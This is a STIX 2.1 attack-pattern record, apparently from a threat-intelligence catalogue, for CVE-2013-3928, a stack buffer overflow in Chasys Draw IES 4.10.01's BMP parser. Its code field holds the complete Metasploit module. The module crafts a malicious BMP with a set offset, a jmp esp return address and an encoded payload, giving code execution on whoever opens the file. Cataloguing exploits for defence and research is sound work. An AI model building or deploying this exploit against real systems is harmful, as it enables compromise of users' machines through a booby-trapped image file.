{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e5407af0-503e-4527-95b7-ad341eaff092",
    "created": "2024-08-14T16:37:11.266683Z",
    "modified": "2024-08-14T16:37:11.266687Z",
    "name": "\"Chasys Draw IES Buffer Overflow\"",
    "description": " This module exploits a buffer overflow vulnerability found in Chasys Draw IES (version 4.10.01). The vulnerability exists in the module flt_BMP.dll, while parsing BMP files, where the ReadFile function is used to store user provided data on the stack in an insecure way. It results in arbitrary code execution under the context of the user viewing a specially crafted BMP file. This module has been tested successfully with Chasys Draw IES 4.10.01 on Windows XP SP3 and Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/chasys_draw_ies_bmp_bof.rb",
            "external_id": "chasys_draw_ies_bmp_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3928"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20140326093457/http://secunia.com/advisories/53773/"
        },
        {
            "source_name": "reference",
            "url": "http://longinox.blogspot.com/2013/08/explot-stack-based-overflow-bypassing.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Chasys Draw IES Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a buffer overflow vulnerability found in Chasys Draw IES\n        (version 4.10.01). The vulnerability exists in the module flt_BMP.dll, while\n        parsing BMP files, where the ReadFile function is used to store user provided data\n        on the stack in an insecure way. It results in arbitrary code execution under the\n        context of the user viewing a specially crafted BMP file. This module has been\n        tested successfully with Chasys Draw IES 4.10.01 on Windows XP SP3 and Windows 7\n        SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Christopher Gabriel',     # Vulnerability Discovery\n          'Longinos Recuero Bustos', # PoC\n          'Javier \\'soez\\'',         # PoC\n          'juan vazquez'             # Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-3928' ],\n          [ 'OSVDB', '95689' ],\n          [ 'BID', '61463' ],\n          [ 'URL', 'http://web.archive.org/web/20140326093457/http://secunia.com/advisories/53773/' ],\n          [ 'URL', 'http://longinox.blogspot.com/2013/08/explot-stack-based-overflow-bypassing.html' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 21112, # Indeed there is more space available on the stack, just limited by the trigger\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Chasys Draw IES 4.10.01 / Windows XP SP3 / Windows 7 SP1',\n            {\n              'Offset' => 65536,\n              'Ret' => 0x10005fd3 # jmp esp # from flt_BMP.dll v4.10.1.0\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-07-26',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.bmp']),\n      ])\n\n  end\n\n  def exploit\n\n    bof = rand_text(target['Offset'])\n    bof << [target.ret].pack(\"V\")\n    bof << payload.encoded\n\n    bitmap_header = \"\"\n    bitmap_header << [0x28].pack(\"V\")       # HeaderSize\n    bitmap_header << [0x4a3].pack(\"V\")      # Width    # Used to trigger the overflow\n    bitmap_header << [0x1].pack(\"V\")        # Height\n    bitmap_header << [0x9].pack(\"v\")        # Planes   # Used to trigger the overflow\n    bitmap_header << [0x41].pack(\"v\")       # BitCount # Used to trigger the overflow\n    bitmap_header << [0x0].pack(\"V\")        # Compression\n    bitmap_header << [bof.length].pack(\"V\") # SizeImage\n    bitmap_header << [0x0].pack(\"V\")        # PelsPerMeterX\n    bitmap_header << [0x0].pack(\"V\")        # PelsPerMeterY\n    bitmap_header << [0x0].pack(\"V\")        # ClrUse\n    bitmap_header << [0x0].pack(\"V\")        # ClrImportant\n\n    total_size = bof.length + bitmap_header.length + 14 # 14 => file header length\n\n    file_header = \"\"\n    file_header << \"BM\"                     # Signature\n    file_header << [total_size].pack(\"V\")   # Size\n    file_header << [0].pack(\"V\")            # Reserved\n    file_header << [0x36].pack(\"V\")         # BitsOffsets\n\n    bmp = file_header + bitmap_header + bof\n    file_create(bmp)\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2013-07-26",
    "x_mitre_platforms": [
        "win'"
    ]
}